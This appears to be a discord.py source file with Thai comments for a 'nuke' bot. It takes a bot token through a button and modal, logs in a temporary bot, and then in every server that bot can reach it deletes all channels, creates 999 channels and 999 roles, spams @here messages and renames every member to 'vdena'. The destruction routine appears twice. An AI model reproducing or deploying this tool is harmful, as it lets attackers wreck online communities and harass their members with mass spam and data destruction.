import discord
from discord.ext import commands
from discord.ui import Button, View, TextInput
import asyncio

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

ADMIN_ID = 1127935823195668480  # เปลี่ยนเป็น ID ของคุณ
TOKEN = None

class TokenInputView(View):
    def __init__(self):
        super().__init__()
        self.token = None

    @discord.ui.button(label="ใส่โทเค่น", style=discord.ButtonStyle.primary)
    async def enter_token(self, button: discord.ui.Button, interaction: discord.Interaction):
        modal = TokenInputModal()
        await interaction.response.send_modal(modal)

class TokenInputModal(discord.ui.Modal):
    def __init__(self):
        super().__init__(title="ใส่โทเค่น")
        self.token = discord.ui.TextInput(label="โทเค่น", placeholder="วางโทเค่นที่นี่", style=discord.TextStyle.short)
        self.add_item(self.token)

    async def on_submit(self, interaction: discord.Interaction):
        global TOKEN
        TOKEN = self.token.value
        await interaction.response.send_message("✅ Token ถูกตั้งค่าเรียบร้อย! บอทจะทำงานเป็นเวลา 5 นาที")
        await self.run_temp_bot()

    async def run_temp_bot(self):
        temp_bot = commands.Bot(command_prefix="!", intents=intents)

        @temp_bot.event
        async def on_ready():
            print(f"Temp bot logged in as {temp_bot.user}")
            await self.nuke(temp_bot)

        try:
            await temp_bot.start(TOKEN)
            await asyncio.sleep(300)  # ทำงาน 5 นาที
        except Exception as e:
            print(f"Error in temp bot: {e}")
        finally:
            await temp_bot.close()

    async def nuke(self, bot):
        guilds = bot.guilds
        for guild in guilds:
            # เปลี่ยนชื่อเซิร์ฟเวอร์
            await guild.edit(name="VDENA")

            # ลบทุกห้อง
            for channel in guild.channels:
                await channel.delete()

            # สร้าง 999 ห้อง
            for i in range(1, 1000):
                await guild.create_text_channel(f"vdena-channel-{i}")

            # สร้าง 999 ยศ
            for i in range(1, 1000):
                await guild.create_role(name=f"vdena-role-{i}")

            # ส่งข้อความไปทุกช่อง
            for channel in guild.text_channels:
                await channel.send("@here vdenaมาเเล้ววว")

            # เปลี่ยนชื่อทุกคนเป็น vdena
            for member in guild.members:
                try:
                    await member.edit(nick="vdena")
                except:
                    continue

class NukeCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.temp_bot = None

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def set_token(self, ctx):
        embed = discord.Embed(
            title="ตั้งค่าโทเค่น",
            description="กดปุ่มด้านล่างเพื่อใส่โทเค่นของบอท",
            color=0x00ff00
        )
        view = TokenInputView()
        await ctx.send(embed=embed, view=view)

    @commands.command()
    @commands.has_permissions(administrator=True)
    async def nuke(self, ctx):
        if TOKEN:
            await ctx.send("✅ เริ่มกระบวนการทำลายเซิร์ฟเวอร์...")
            temp_bot = commands.Bot(command_prefix="!", intents=intents)

            @temp_bot.event
            async def on_ready():
                print(f"Temp bot logged in as {temp_bot.user}")
                await self.nuke(temp_bot)

            try:
                await temp_bot.start(TOKEN)
                await asyncio.sleep(300)  # ทำงาน 5 นาที
            except Exception as e:
                print(f"Error in temp bot: {e}")
            finally:
                await temp_bot.close()
        else:
            await ctx.send("❌ โทเค่นยังไม่ได้ตั้งค่า กรุณาใช้คำสั่ง `!set_token` เพื่อตั้งค่าโทเค่น")

    async def nuke(self, bot):
        guilds = bot.guilds
        for guild in guilds:
            # เปลี่ยนชื่อเซิร์ฟเวอร์
            await guild.edit(name="VDENA")

            # ลบทุกห้อง
            for channel in guild.channels:
                await channel.delete()

            # สร้าง 999 ห้อง
            for i in range(1, 1000):
                await guild.create_text_channel(f"vdena-channel-{i}")

            # สร้าง 999 ยศ
            for i in range(1, 1000):
                await guild.create_role(name=f"vdena-role-{i}")

            # ส่งข้อความไปทุกช่อง
            for channel in guild.text_channels:
                await channel.send("@here vdenaมาเเล้ววว")

            # เปลี่ยนชื่อทุกคนเป็น vdena
            for member in guild.members:
                try:
                    await member.edit(nick="vdena")
                except:
                    continue

async def setup(bot):
    await bot.add_cog(NukeCommands(bot))